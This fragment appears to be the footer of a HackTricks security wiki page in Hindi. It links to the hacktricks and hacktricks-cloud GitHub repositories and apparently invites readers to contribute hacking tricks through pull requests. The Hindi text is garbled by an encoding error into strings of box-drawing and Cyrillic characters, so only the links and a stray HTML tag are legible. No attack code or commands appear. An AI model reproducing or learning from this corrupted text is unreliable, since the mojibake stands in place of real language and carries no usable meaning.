* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
